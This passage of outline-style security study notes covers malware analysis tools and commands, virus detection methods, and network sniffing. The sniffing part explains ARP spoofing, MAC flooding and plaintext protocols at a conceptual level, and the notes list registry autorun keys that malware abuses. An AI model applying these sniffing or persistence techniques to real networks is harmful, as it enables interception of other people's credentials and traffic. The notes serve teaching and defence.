					- This process complicates reverse engineering, making it more difficult to uncover the program's logic and metadata through static analysis. Tools like PEiD can help detect common packers, cryptors, and compilers used for PE executable files. Identifying the packer simplifies the task of choosing the appropriate tool for unpacking the code.
					- Packaging/Obfuscation Tools:

						- Portable Executable Scanner (pescan) (tzworks.net)
						- Resource Hacker (www.angusj.com)
				- Identifying File Dependencies:
					- Software programs rely on various inbuilt libraries of the operating system to perform specific actions. To function correctly, programs often need to interact with internal system files. File dependencies provide information about the system files required by the program, including the process of registration and their locations on the machine. Identifying these dependencies is crucial, as they contain information about the runtime requirements of an application and may offer insights into potential malware within the file.
					- File dependencies include linked libraries, functions, and function calls. By checking the dynamically linked list in a malware executable, it is possible to determine the libraries and functions the program uses, which can help estimate its behavior. Understanding the various DLLs used to load and run the program is essential. Tools like DependencyWalker can help identify the dependencies within an executable file.
					- List of Standard dlls:
						- Kernel32.dll : Core functionality, such as access and manipulation of memory, files, and hardware

							- Extract Symbols from ELF Executable: readelf -s <malware_sample>
						- Identifying Program Headers in ELF Executables:
							- The program headers in an ELF executable reveal the memory layout of the binary code. They help determine whether the ELF executable file is properly packed. To view this information, the readelf tool can be used with the -l option, followed by the ELF executable file name.
							- Retrieve ELF Program Headers: readelf -l <malware_sample>
						- Identifying ELF File Headers:
							- The ELF executable file header contains general information, such as the binary's entry point, program headers, and table locations. This data helps determine the file's architecture and the machine for which it is designed to run.
							- Retrieve Information Contained in ELF File Header: readelf --file-header <malware_sample>
						- Extracting Strings from ELF Executable Files:
							- String extraction involves collecting vital information from a suspected ELF executable file. Strings such as symbols, section names, and function names reveal the purpose of the binary code. Linux includes a default command called strings, which extracts these strings and saves them in a .txt file.
							- Extract Strings from ELF Executable File: strings malware_sample > str.txt
						- Analyzing String Reuse Using Intezer:
							- Intezer is a malware analysis platform that scans files, URLs, endpoints, and memory dumps. It extracts strings from uploaded malware samples and identifies whether those strings are used in other files. By analyzing unknown malware that is difficult to trace, it reduces the effort required by malware analysts.
				- Analyzing Mach-O Executable Files:
					- The Mach Object (Mach-O) file format is an executable file format analogous to the Portable Executable (PE) format for Windows and the Executable and Linkable Format (ELF) for Linux. It is primarily associated with binaries used in macOS and iOS. This file format is employed to distribute executable code and defines how memory interacts with the data and code contained within a binary file.
					- Mach-O malware can directly impact a program’s performance, as memory usage and paging activities are influenced by the arrangement of code within the binary. This type of malware enables attackers to create overlapping memory arrays and assign specific memory locations for executing a Mach-O executable. By exploiting these mechanisms, attackers can achieve privilege escalation and exploit subsequent vulnerabilities, potentially gaining root access.
					- Malicious Mach-O Binaries:
						- Mach-O is a binary format consisting of byte streams organized into meaningful data chunks, such as CPU type, data size, and byte order. It is structured into segments like __PAGEZERO, __TEXT, __DATA, and __OBJC, each containing specific types of code or data. Attackers may exploit these segments to conceal and execute malicious code for privilege escalation.
						- To mitigate such threats, security analysts should analyze Mach-O malware and implement protective measures. Tools like pagestuff, LIEF, and otool can aid in detecting and preventing privilege escalation in macOS systems.
					- Reverse Engineering Mach-O Binaries:
						- Mach-O binaries consist of various segments and their corresponding sections, making it essential for security analysts to evaluate the internal structure of a binary to identify malicious code. Additionally, reverse engineering can be employed to examine all methods and executable files within these segments, helping to mitigate potential threats. Tools like Hopper Disassembler are useful for analyzing Mach-O binary files.

				- Analyzing Malicious MS Office Documents:
					- The use of MS Office documents, such as Word documents and PowerPoint presentations, is widespread across organizations. Attackers often exploit these documents to distribute and install malware. When analyzing malware, it is crucial to understand the structure of various MS Office documents and effectively analyze any malicious files.
					- Oletools is a Python-based suite designed to analyze Microsoft OLE2 files, commonly found in MS Office documents. It enables cybersecurity professionals to extract, parse, and detect malicious content within these files. By analyzing macros, embedded objects, and metadata, Oletools identifies potentially harmful elements, such as hidden scripts or exploit code. This makes it a vital tool for uncovering and mitigating threats from malicious Office documents, frequently used in phishing attacks and malware distribution.
					- Finding Suspicious Components:
						- Use the Python-based tool oleid to analyze malicious Office documents and review components that may be classified as suspicious or malicious. The oleid tool is specifically designed for examining OLE files.
						- Shows that malicious Word document named Infected.docx contains VBA macros: python3 oleid.py ‘<path_to_suspect_document>’
					- Finding Macro Streams:
						- The next step is to parse the malicious Office document using oledump to identify streams containing macros.
						- Identify Streams Containing Macros: python3 oledump.py ‘<path_to_suspect_document>’
					- Dumping Macro Streams:
						- Extract the contents of a specific macro stream using oledump:
						- python3 oledump.py -s <stream number> <path_to_suspect_document>
					- Identifying Suspicious VBA Keywords:
						- The olevba tool can be used to view the source code of all VBA macros embedded in a document and identify suspicious VBA keywords and obfuscation techniques commonly used by malware.
						- Review the source code of all VBA macros to determine if the document contains auto-executable macros, obfuscated strings, or indicators of compromise (IOCs), such as filenames, IP addresses, or URLs. Use the following command:
						- python3 olevba.py ‘<path_to_suspect_document>
				- Analyzing Suspicious PDF Documents:
					- PDF documents are commonly used for both personal and business purposes, making them a frequent target for attackers to hide malicious scripts that execute when the document is opened. When analyzing a suspicious PDF file, it is important to perform scans using various tools to determine if it contains malicious scripts. Extract these scripts to assess their potential impact on the system and network.
					- To identify potentially malicious elements in PDF files, tools like PDFiD can scan for specific keywords and object types commonly associated with exploits. Additionally, tools such as PDFStreamDumper allow for deeper analysis, including the inspection and extraction of streams and objects within a PDF.
					- Testing the File with PDFiD to Analyze PDF Keywords:
						- The tool will display the structure of the file, including its contents, such as the header, objects, and any scripts present.
						- Test the suspect PDF file with the PDFiD tool to identify any malicious components:
						- python3 pdfid.py '<path_to_suspect_PDF_file>'
					- Finding Suspicious Objects with PDFStreamDumper:
						- Tools like PDFStreamDumper can be used to explore the internal elements of a suspect PDF file, including objects, streams, and embedded obfuscated scripts. After opening the file in PDFStreamDumper, review the objects one by one along with their stream details to identify any malicious components.
						- The analysis of the fifth object in the infected.pdf file using PDFStreamDumper reveals that it contains a JavaScript header, with its data stream starting in the sixth object. Scanning the sixth object for readable strings, as shown in the screenshot below, indicates the use of the util.printf() function, which can display gathered system data.
					- Scanning the File for Exploits:
						- Scan the suspect PDF file for any potential exploits using the PDFStreamDumper tool. To do this, click the Exploits_Scan button in the toolbar. The tool will then compare the file against a set of known PDF exploit signatures and generate the results in a Notepad file.
				- Analyzing Suspicious Documents Using YARA:
					- YARA (Yet Another Recursive Acronym) is a powerful tool used to identify and classify malware samples. It allows users to create rules that describe patterns of interest in files, such as specific strings, binary sequences, or combinations of characteristics commonly found in malware. These rules are then used to scan files and detect matches, indicating the presence of malicious content.
					- Key features of YARA include its ability to perform both string and binary pattern matching, support for complex conditions and Boolean expressions, and the capability to scan files, directories, and even memory. The tool is highly flexible and can be integrated into various security workflows and automation scripts, making it an essential asset for malware analysis and other cybersecurity operations.
					- Structure of YARA Rules:
						- A YARA rule is structured with specific sections, including the rule header, metadata, strings, and conditions.
						- Rule Header: This section includes the rule's name and optional tags.
						- Metadata: This section is optional and can include key-value pairs that provide additional information about the rule.
						- Strings: This section defines the strings to search for in the files. Strings can be text, hexadecimal, or regular expressions.
						- Condition: This section defines the logic that must be met for the rule to match. It typically involves checking whether one or more of the defined strings are present in the file.
		- Dynamic Analysis:
			- In dynamic analysis, malware is executed in a controlled environment to understand its behavior after infection. This type of analysis requires a safe environment, such as virtual machines and sandboxes, to prevent the malware from spreading. The environment should be designed with tools that can capture every action of the malware in detail and provide relevant feedback. Virtual systems are typically used as the foundation for conducting these experiments.
			- Dynamic analysis is performed to gather valuable information about the malware's activity, such as files and folders created, ports and URLs accessed, functions and libraries called, applications and tools used, information transferred, settings modified, and processes and services started.
			- The environment for dynamic analysis should be set up in a way that prevents malware from propagating to the production network and ensures that the testing system can be restored to a previous state if anything goes wrong during the test.
			- Dynamic Analysis Consists of Two Stages:
				- System Baselining:
					- Baselining refers to the process of capturing the system's state (taking a snapshot) at the beginning of the malware analysis, which can later be compared with the system's state after executing the malware. The main purpose of system baselining is to identify significant changes from the baseline state, helping to understand the impact the malware has had on the system.
					- System baselining involves recording details such as the file system, registry, open ports, network activity, and other relevant system information.
				- Host Integrity Monitoring:
					- Host integrity monitoring is the process of studying changes that occur across a system or machine after a series of actions or incidents. It involves taking snapshots of the system before and after the event using the same tools, then analyzing the changes to evaluate their impact on the system and its properties.
					- In malware analysis, host integrity monitoring helps to understand the runtime behavior of a malware file, including its activities, propagation techniques, URLs accessed, downloads initiated, and other actions it performs. This process detects changes made to the system's entities, such as files, processes, or configurations, during the analysis.
					- Host Integrity Monitoring includes the following:
						- Port Monitoring:
							- Malware programs compromise the system and open input/output ports to establish connections with remote systems, networks, or servers to carry out various malicious activities. These open ports can also serve as backdoors for other harmful malware or programs. Open ports act as communication channels, allowing malware to connect back to its handlers by opening unused ports on the victim's machine. Scanning for suspicious ports can help identify such malware.
							- During dynamic analysis, malware activity can be monitored for attempts to access particular ports using port monitoring tools like TCPView or command-line utilities such as netstat. These tools provide details such as the protocol used, local and remote addresses, and the connection's state. Additional information, such as process name, process ID, and remote connection protocol, may also be available. Port monitoring tools should be used to scan for suspicious ports and check for connections to unknown or suspicious IP addresses.
							- Port Monitoring Tools:
								- Netstat : It displays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, IPv4 statistics (for IP, ICMP, TCP, and UDP protocols), and IPv6 statistics (for IPv6, ICMPv6, TCP over IPv6, and UDP over IPv6 protocols). When used without parameters, netstat displays only active TCP connections.
								- TCPView : TCPView is a Windows program that provides detailed listings of all TCP and UDP endpoints on the system, including local and remote addresses, as well as the state of TCP connections. It offers a subset of the netstat program that comes with Windows. The TCPView download also includes Tcpvcon, a command-line version with the same functionality. When TCPView is run, it enumerates all active TCP and UDP endpoints, resolving IP addresses to their domain name equivalents.

						- Process Monitoring:
							- Malware can enter a system through images, music files, videos, and other files downloaded from the Internet. It often disguises itself as legitimate Windows services and hides its processes to avoid detection. Some malware uses Portable Executable (PE) files to inject itself into various processes (such as explorer.exe or web browsers). While these malicious processes are visible, they appear legitimate, allowing them to bypass desktop firewalls. Attackers may use rootkit techniques to conceal malware, making it harder for antivirus software to detect.
							- Process monitoring is crucial for understanding the processes initiated by malware and the ones it takes over after execution. It is also important to monitor child processes, associated handles, loaded libraries, functions, and the execution flow of boot-time processes to fully define the nature of a file or program. By gathering information on processes running before and after malware execution, and comparing them, analysts can more quickly identify all the processes that malware starts. Using process-monitoring tools such as Process Monitor helps in detecting suspicious processes and speeding up the analysis.
							- Process Monitoring Tools:
								- Process Monitor : Process Monitor is a Windows monitoring tool that displays real-time file system, registry, and process/thread activity. It combines the functionality of two legacy Sysinternals utilities, Filemon and Regmon, while adding several enhancements, including advanced and non-destructive filtering, comprehensive event properties (such as session IDs and usernames), reliable process information, full thread stacks with integrated symbol support for each operation, and the ability to log events simultaneously to a file. These unique features make Process Monitor an essential tool in system troubleshooting and malware analysis toolkits.

								- Monit (mmonit.com)
								- ESET SysInspector (www.eset.com)
								- System Explorer (systemexplorer.net)
						- Windows Registry Monitoring:
							- The Windows registry stores operating system and program configuration details, including settings and options. If the malware is a program, its functionality may also be stored in the registry. Malware often leverages the registry to persistently perform harmful activities by creating entries that ensure the malicious program runs automatically whenever the computer or device boots.
							- Windows automatically executes instructions in specific sections of the registry, including:
								- Run
								- RunServices
								- RunOnce
								- RunServicesOnce
								- HKEY_CLASSES_ROOT\exefile\shell\open\command ("%1" %*)
							- Malware often inserts instructions in these sections to carry out malicious activities. A solid understanding of the Windows registry, its structure, and its inner workings is essential for analyzing potential malware. Scanning for suspicious registry entries can aid in detecting malware infections. Tools like RegScanner can be used to examine registry values for any entries that appear suspicious or indicative of a malware infection.
							- To detect and analyze changes made by malware to the system registry, use registry monitoring tools such as jv16 PowerTools.
							- Registry Monitoring Tools:
								- jv16 PowerTools : jv16 PowerTools is a PC system utility software designed to optimize system by removing unnecessary files and data, cleaning the Windows registry, automatically fixing system errors, and improving overall performance.

						- Windows Services Monitoring:
							- Attackers design malware and other malicious code to install and run on a computer as services. Since most services operate in the background to support processes and applications, malicious services can remain hidden while performing harmful activities without user intervention or input.
							- Malware often spawns Windows services to enable attackers to remotely control the victim’s machine and execute malicious instructions. To avoid detection, malware may disguise its processes by renaming them to resemble legitimate Windows services. Additionally, malware can use rootkit techniques to manipulate registry keys, such as HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services, to hide its processes and services.
							- These malicious services often run under privileged accounts, such as the SYSTEM account, granting them greater access than standard user accounts and making them more dangerous than typical malware or executable files. Attackers further conceal their actions by naming malicious services similarly to legitimate Windows services.
							- To identify and trace malicious services initiated by malware during dynamic analysis, use Windows service monitoring tools like Windows Service Manager (SrvMan). These tools detect service changes and scan for suspicious Windows services.
							- Windows Service Monitoring Tools:
								- Windows Service Manager (SrvMan):
									- SrvMan offers both GUI and command-line modes. It can also run arbitrary Win32 applications as services, automatically closing the main application window when the service is stopped.

						- Event Logs Monitoring/Analysis:
							- Log analysis involves examining computer-generated records or activities to identify malicious or suspicious events. This process provides detailed information about activities or events, which can reveal possible attacks, such as Trojans or worms in the system. It serves as a vital source of information for identifying security gaps and detecting threats.
							- Log analysis can uncover zero-day backdoor Trojans or other potential attacks, such as failed authentication or login attempts, by analyzing logs from various components. Logs from security-critical components, including firewall systems, IDS/IPS, web servers, and authentication servers, are particularly valuable. They often contain details such as file types, ports, timestamps, and registry entries.
							- In Windows, system logs, application logs, access logs, audit logs, and security logs can be analyzed using the Event Viewer under the Windows Logs section. To streamline the process, use log analysis tools like Splunk to identify suspicious logs or events with malicious intent.
							- Locating System Logs:

	- Virus Detection Methods:
		- Scanning:
			- A virus scanner is essential software for detecting and preventing viruses. Without a scanner, the system is highly susceptible to virus attacks. Antivirus tools should run continuously and be updated regularly to keep the scan engine and virus signature database current.
			- Virus writers often modify existing viruses to create new variants, aiming to evade detection. To counter this, modern scanners use advanced techniques like code analysis, examining various parts of executable files to enhance virus recognition.
		- Integrity checking:
			- Integrity-checking products function by reading and recording integrated data to develop a signature or baseline for files and system sectors. However, a limitation of basic integrity checkers is their inability to distinguish between file corruption caused by bugs and that caused by viruses. To address this, some integrity checkers combine antivirus techniques with integrity checking, creating a hybrid tool.
		- Interception:
			- The primary objective of an interceptor is to deflect logic bombs and Trojans. It achieves this by monitoring and controlling requests to the operating system for network access or actions that could threaten programs. When such a request is detected, the interceptor prompts the user to decide whether to allow it.
			- However, there is no reliable method to intercept direct branches to low-level code or direct input/output instructions executed by a virus. Additionally, some viruses are capable of disabling the monitoring program itself, further complicating detection and prevention.
		- Code Emulation:
			- Code emulation allows antivirus software to use a virtual machine to simulate CPU and memory activities. In this process, the virus code is executed within the virtual machine rather than the actual processor. This approach is particularly effective against encrypted and polymorphic viruses. Over time, the decrypted virus body is exposed and can be detected by the scanner. Code emulation can also identify metamorphic viruses, whether they use single or multiple encryption layers.
			- However, a drawback of code emulation is its inefficiency when dealing with viruses that have very long decryption loops, as the process becomes significantly slower.
		- Heuristic Analysis:
			- This method aids in detecting new or unknown viruses, often variants of an existing virus family. Heuristic analysis can be either static or dynamic. In static analysis, the antivirus tool examines the file format and code structure to assess whether the code is malicious. In dynamic analysis, the antivirus tool emulates the execution of suspicious code to determine its behavior.
			- A major drawback of heuristic analysis is its susceptibility to false positives, where benign code is incorrectly identified as malicious. This can lead users to mistrust positive test results, potentially dismissing a real threat as a false alarm.
	- Malware Code Emulation:
		- Malware code emulation is a technique used to perform static or dynamic malware analysis on suspected malware samples. It creates an isolated virtual environment to execute a malware sample by mimicking its hardware and software requirements without interrupting its actual functionality. This method allows for thorough examination without compromising the host system.
		- Unlike sandboxing, which uses an isolated environment with a real operating system to run malware samples for behavior analysis, code emulation temporarily simulates components such as processors, memory, hard disks, network devices, operating systems, antivirus software, and system registries. This approach enables greater control over the malware's execution and provides more flexibility in the analysis.
		- Malware emulators offer the ability to set breakpoints to pause execution, allowing the malware to bypass anti-malware techniques. They can emulate and run malware on multiple operating systems, requiring fewer resources than sandboxes.

	- Malware Code Instrumentation:
		- Malware code instrumentation is a technique used in cybersecurity to analyze and understand the behavior of malicious software by injecting additional code or instructions at specific points within the binary code. These instructions enable the capture of critical events or actions performed by malware during execution, such as logging function calls, tracking memory allocations, monitoring network communications, and recording file system interactions in real time.
		- Analysts can then examine the collected data to gain insights into the malware's behavior, attack techniques, capabilities, and intent, which can help in developing effective countermeasures to mitigate the threats posed by the malware.
		- However, malware code instrumentation is a challenging process due to the complexity of analyzing and modifying binary code, and attackers may employ anti-analysis techniques to evade detection and thwart instrumentation efforts. Tools like Frida and HawkEye can be used to perform code instrumentation.
		- Code Instrumentation Tools:
			- HawkEye : HawkEye is a dynamic malware instrumentation tool based on the frida.re framework. It allows to hook common functions to log malware activities and output the results in a well-organized webpage report. HawkEye can run in two modes: spawning a malware sample in a new process by providing its path, or hooking a running process using its PID.

	- AI-based Malware Analysis: FakeGPT:
		- In February 2023, a sophisticated malware campaign called FakeGPT was discovered, exploiting ChatGPT’s popularity to distribute a malicious Chrome extension named "Quick Access to Chat GPT." The extension provided access to a fake ChatGPT platform designed to compromise Facebook accounts. It installed a covert Facebook app backdoor, granting attackers super-admin rights to high-profile business accounts. This allowed them to build a botnet and a malicious advertising mechanism, using victims’ resources to spread paid ads in a self-replicating, wormlike manner.

# Sniffing

- Network/Packet Sniffing
	- Packet sniffing is the process of monitoring and capturing data packets that pass through a network, typically using specialized software or hardware tools. Packet sniffers can intercept packets containing sensitive information such as passwords, account details, syslog traffic, router configurations, DNS queries, email traffic, web traffic, chat sessions, and FTP credentials. This enables an attacker to read cleartext passwords, view actual emails, and access sensitive data such as credit card numbers and financial transactions.
	- Packet sniffing can also capture traffic from protocols like SMTP, POP, IMAP, HTTP Basic authentication, Telnet, SQL databases, SMB, NFS, and FTP. By analyzing the captured data, an attacker can gather valuable information to compromise the network. Additionally, attackers can enhance the effectiveness of their attacks by combining packet sniffing with active transmission techniques.
	- Sniffing is easier in hub-based networks, where traffic is broadcast to all connected hosts. In modern switch-based networks, a switch forwards data only to the port associated with the destination MAC address, unlike a hub, which sends data to all ports. To capture traffic on a switch, attackers must manipulate its functionality. A packet sniffer in promiscuous mode can bypass Ethernet NIC filters to capture and analyze all traffic on a subnet, although it cannot access packets from other networks.
	- Despite widespread use of switches, sniffing remains effective. Open switch ports in many networks allow devices to connect and access traffic. Attackers can also install remote sniffing tools on high-traffic components like servers and routers, enabling them to monitor and capture network traffic from a single point.
	- Working of Sniffer:
		- The most common way to network computers is through an Ethernet connection. A computer connected to a local area network (LAN) has two types of addresses: a MAC address and an Internet Protocol (IP) address. The MAC address uniquely identifies each device in the network and is stored on the NIC (Network Interface Card). Ethernet uses the MAC address to transfer data by incorporating it into data frames. At the data link layer of the OSI model, an Ethernet header uses the MAC address of the destination machine rather than the IP address.
		- The network layer handles mapping IP addresses to MAC addresses, as required by the data link protocol. It first checks the Address Resolution Protocol (ARP) cache, a table that stores mappings of IP addresses to MAC addresses. If no entry exists for the destination IP address, an ARP broadcast request is sent to all devices on the local subnet. The device with the matching IP address responds with its MAC address, which is then added to the source machine’s ARP cache. Subsequent communications between the source and destination machines use the cached MAC address.
		- There are two basic types of Ethernet environments, and sniffers operate differently in each:
			- Shared Ethernet:
				- In a shared Ethernet environment, all hosts are connected to a single bus and compete for bandwidth. When one machine (e.g., machine 1) communicates with another (e.g., machine 2), it sends a packet onto the network with the destination MAC address of machine 2 and its own source MAC address. Other machines (e.g., machines 3 and 4) compare the frame's destination MAC address to their own and discard unmatched frames. However, a machine running a sniffer bypasses this rule and accepts all frames. Sniffing in a shared Ethernet environment is passive and therefore difficult to detect.
			- Switched Ethernet:
				- In a switched Ethernet environment, hosts are connected to a switch instead of a hub. The switch maintains a table that maps each computer's MAC address to the physical port it is connected to and forwards packets only to the intended recipient. Unlike a hub, a switch does not broadcast packets to all devices, resulting in better bandwidth utilization and enhanced security. Consequently, placing a NIC into promiscuous mode to capture packets is ineffective. This has led many to believe that switched networks are secure and immune to sniffing. However, this is not entirely true.
		- Network Sniffing Methods:
			- ARP Spoofing:
				- The Address Resolution Protocol (ARP) is stateless, meaning a machine can send an ARP reply without receiving a request, and other devices may accept such unsolicited replies. To sniff traffic from another system, a machine can perform ARP spoofing by impersonating the network gateway. This causes the target machine's ARP cache to store an incorrect entry for the gateway's MAC address. As a result, all traffic intended for the gateway is redirected to the machine that spoofed the gateway's MAC address.
			- MAC Flooding:
				- Switches maintain a translation table that maps MAC addresses to the physical ports on the switch, allowing them to intelligently route packets between hosts. However, switches have limited memory. MAC flooding exploits this limitation by overwhelming the switch with fake MAC addresses until it can no longer process them. When the switch's memory is exhausted, it enters fail-open mode, behaving like a hub by broadcasting packets to all ports. This makes it easier to perform sniffing. The tool macof, which is part of the dsniff suite, is commonly used by attackers to carry out MAC flooding.
			- When a switch operates as a hub, it broadcasts all packets to all network devices. Normally, NICs only accept packets addressed to them, as promiscuous mode is disabled by default. A sniffer enables promiscuous mode, allowing the NIC to capture all traffic on the network segment. Attackers exploit this by configuring their NICs in promiscuous mode to intercept and analyze all transmitted packets.
	- Types of Sniffing:
		- Passive Sniffing:
			- Passive sniffing does not involve sending packets; it simply captures and monitors packets flowing through the network. A packet sniffer alone is generally not preferred for attacks because it functions only within a common collision domain. A common collision domain refers to a network segment that is not switched or bridged, typically found in hub-based networks. In such environments, all hosts can see all network traffic, making it easy to capture data using passive sniffing.
			- Most modern networks use switches instead of hubs, which reduces the risk of passive sniffing. Passive sniffing offers significant stealth advantages compared to active sniffing, as it does not generate detectable traffic.
			- Passive Sniffing Methods (to gain control over target network):
				- Compromising Physical Security : An attacker who breaches the physical security of an organization can connect a laptop to the network to capture sensitive information.
				- Using a Trojan Horse : Many Trojans have built-in sniffing capabilities. An attacker can install a Trojan on a victim’s machine to compromise it and then deploy a packet sniffer to intercept network traffic.
		- Active Sniffing:
			- Active sniffing involves injecting traffic into a switched LAN to capture data. Unlike hub-based networks, switches do not broadcast packets to all systems, making passive sniffing ineffective. Active sniffing is harder to detect but can be achieved by injecting ARP traffic to intercept network data.
			- Switches maintain an ARP cache in Content Addressable Memory (CAM), mapping hosts to ports. A sniffer records visible network traffic, allowing attackers to view sensitive information. Active sniffing includes sending network probes to identify access points.
			- Active Sniffing Techniques:
				- MAC Flooding
				- DNS Poisoning
				- ARP Poisoning
				- DHCP Attacks
				- Switch Port Stealing
				- Spoofing Attack
	- Protocols Vulnerable to Sniffing:
		- Telnet and Rlogin : Telnet is a protocol that allows communication with a remote host via port 23 using a command-line terminal. Rlogin enables remote login to a network machine through a TCP connection. Neither protocol provides encryption, meaning data transmitted between clients is in plaintext and vulnerable to sniffing. Attackers can intercept keystrokes, including usernames and passwords.
		- HTTP : The default version of HTTP has vulnerabilities that cause websites to transmit user data in plaintext across the network, making it susceptible to interception by attackers who can steal user credentials.
		- SNMP : Simple Network Management Protocol (SNMP) is a TCP/IP-based protocol used to exchange management information between network devices. The first versions of SNMP (SNMPv1 and SNMPv2) lack strong security, causing data to be transmitted in plaintext. Attackers exploit these vulnerabilities to capture passwords in cleartext.
		- SMTP : Simple Mail Transfer Protocol (SMTP) is used to transmit email messages over the Internet. In most implementations, SMTP transmits messages in plaintext, allowing attackers to intercept and capture plaintext passwords. Furthermore, SMTP lacks built-in protection against sniffing attacks.
		- NNTP : Network News Transfer Protocol (NNTP) is used for distributing, retrieving, posting, and inquiring about news articles over a reliable stream-based transmission within the ARPA-Internet community. However, NNTP does not encrypt data, making it vulnerable to attackers who can sniff and capture sensitive information.
		- POP : Post Office Protocol (POP) enables a user’s workstation to retrieve email from a mailbox server. Outgoing mail is typically sent from the workstation to the mailbox server via SMTP. However, due to weak security implementations, POP transmits data in plaintext, making it easy for attackers to sniff and capture sensitive information.
		- FTP : File Transfer Protocol (FTP) allows clients to share files between computers on a network. However, FTP lacks encryption, making it vulnerable to sniffing attacks. Attackers can intercept and capture data, including user credentials, using tools such as Hashcat.
		- IMAP : Internet Message Access Protocol (IMAP) enables clients to access and manage email messages stored on a server. However, due to inadequate security measures, IMAP transmits data in plaintext, allowing attackers to intercept and capture sensitive information, including user credentials.
		- TFTP : Trivial File Transfer Protocol (TFTP) is a simple file transfer protocol implemented over UDP/IP. It lacks authentication and encryption mechanisms, making transferred data easily accessible to anyone on the same network.
	- Sniffing in the Data Link Layer of the OSI Model:
		- The OSI model organizes network functions into seven layers, with each layer providing services to the layer above and receiving services from the layer below. The data link layer, the second layer of the OSI model, is responsible for encoding and decoding data packets into bits. Sniffers operate at this layer, allowing them to capture packets directly from it. Because the OSI layers are designed to function independently, sniffing at the data link layer goes undetected by the upper layers.
	- Hardware Protocol Analyzers:
		- A hardware protocol analyzer is a device designed to interpret and monitor network traffic by capturing signals without altering the traffic segment. Its primary purpose is to track network usage and identify malicious traffic generated by hacking software. The analyzer captures data packets, decodes them, and analyzes their content based on predefined rules, enabling attackers to view individual data bytes of each packet traversing the network.
		- Unlike software protocol analyzers, hardware analyzers can handle higher data loads without dropping packets, even during data overload. They support a wide range of network connections, including LAN, WAN, wireless, and circuit-based telco lines. Hardware analyzers can also display bus states and low-level events such as high-speed negotiation (e.g., K/J chirps), transmission errors, and retransmissions, while providing precise timestamps for captured traffic. Despite their advanced capabilities, hardware protocol analyzers are expensive, making them less accessible to individual developers, hobbyists, and ordinary hackers.
		- Hardware Protocol Analyzers (manufacturers):
			- Xgig 1000 32/128 G FC & 25/50/100 GE Analyzer:
				- The VIAVI Xgig 1000 32/128 G Fiber Channel (FC) and 25/50/100 G Ethernet (GE) platform is a hardware solution that supports 8G/16G/32G/128G FC and 10/25/50/100 GE in a portable, integrated platform with reconfigurable ports.

				- Xgig 16-Lane PCI Express 4.0 Chassis (www.viavisolutions.com)
	- SPAN Port:
		- The Switched Port Analyzer (SPAN) is a Cisco switch feature, also known as "port mirroring," that monitors network traffic on one or more switch ports. A SPAN port is configured to receive copies of every packet that passes through the switch. It helps analyze and debug data, identify errors, and investigate unauthorized network access.
		- When port mirroring is enabled, the network switch sends a copy of packets from the source port(s) to the destination port, where a network analyzer examines them. While there can be multiple source ports, there must be only one destination port. Source ports are those from which network packets are monitored and mirrored. This feature allows simultaneous monitoring of traffic from multiple ports, such as all ports in a specific virtual local area network (VLAN).
	- Wiretapping:
		- Wiretapping, or telephone tapping, refers to the monitoring of telephone or Internet conversations by a third party with covert intentions. To carry out wiretapping, the attacker first selects a target individual or network host on the network to wiretap and then connects a listening device (hardware, software, or a combination of both) to the circuit carrying information between the target phones or hosts.
		- Typically, this involves intercepting a small portion of the electrical signals transmitted through telephone wires to eavesdrop on the conversation. This allows attackers to monitor, intercept, access, and record information flowing through the communication system.
		- Wiretapping without a warrant or the consent of the individuals involved in the conversation is a criminal offense in most countries and is punishable according to the laws of the respective country.
		- Wiretapping Methods:
			- Official tapping of telephone lines
			- Unofficial tapping of telephone lines
			- Recording conversations
			- Direct line wiretap
			- Radio wiretap
		- Types of Wiretapping:
			- Active Wiretapping: In hacking terminology, active wiretapping is a Man-in-the-Middle (MITM) attack. It allows an attacker to monitor and record the traffic or data flow in a communication system. The attacker can also alter or inject data into the communication or traffic.
			- Passive Wiretapping: Passive wiretapping refers to snooping or eavesdropping. It allows an attacker to monitor and record traffic. By observing the recorded traffic, the attacker can search for passwords or other sensitive information.
	- Lawful Interception:
		- Lawful interception (LI) refers to the legal interception of data communication between two endpoints for surveillance purposes on traditional telecommunications, VoIP, data, and multiservice networks. LI involves obtaining data from a communication network for analysis or use as evidence.
		- It is commonly used in activities such as infrastructure management, protection, and addressing cybersecurity-related issues. In this process, the network operator or service provider grants legal access to private network data, enabling the monitoring of private communications, such as telephone calls and email messages. These operations are conducted by law enforcement agencies (LEAs).
		- This type of interception is necessary solely for monitoring messages exchanged over suspicious channels where users are engaged in illegal activities. Countries worldwide are making efforts to standardize procedures for such interception.
		- The solution comprises a tap/access switch and multiple systems for reconstructing intercepted data. The tap/access switch collects traffic from the Internet service provider (ISP) network, sorts it by IP domain, and forwards it to E-Detective (ED) systems. These systems decode and reconstruct the intercepted traffic into its original format. This process is supported by protocols such as POP3, IMAP, SMTP, P2P, FTP, and Telnet. A Centralized Management Server (CMS) oversees all ED systems.
	- Sniffing Techniques:
		- MAC Flooding:
			- Attackers use the MAC flooding technique to force a switch to function as a hub, allowing them to easily sniff the traffic.
			- MAC Address/CAM Table:
				- In a switched network, an Ethernet switch has a fixed-size dynamic Content Addressable Memory (CAM) table, which stores information such as MAC addresses associated with physical ports and their corresponding virtual LAN (VLAN) parameters.
				- A switch acts as an intermediate device between one or more computers in a network. When a machine sends data to another machine within a network, the data passes through the switch. The switch searches its CAM table for the destination MAC address (found in the Ethernet frame). Once the MAC address is located, the switch forwards the data to the machine through the port associated with that MAC address.
				- This method of data transfer in a switched network is more secure than in a hub-based network, where the hub forwards/broadcasts incoming traffic to all machines in the network.
			- The CAM table on a switch has a limited size. When the CAM table reaches its capacity, any additional ARP request traffic is flooded to all ports on the switch. If the CAM table is flooded with more MAC addresses than it can store, the switch turns into a hub. This enables an attacker to intercept frames sent between a victim host and another host without a corresponding CAM table entry. Once this occurs, the switch broadcasts all incoming traffic to every port, similar to a hub, to ensure data delivery to the intended recipient. This attack also fills the CAM tables of adjacent switches.
			- Attackers exploit this vulnerability through MAC flooding, which involves sending a large volume of fake source MAC address and IP pairs to the switch, causing the CAM table to overflow. An attacker with access to the shared switch within the Ethernet segment can then easily intercept and analyze network traffic.
			- No issues occur until the MAC address table is full. However, once the MAC address table is full, any further requests may force the switch to enter fail-open mode. In the fail-open mode, the switch begins functioning like a hub. The attacker can then configure the machine’s NIC to promiscuous mode to enable the machine to accept and process all the traffic. This enables the attackers to sniff the traffic easily and steal sensitive information.
			- Switch MAC Flooding with macof:
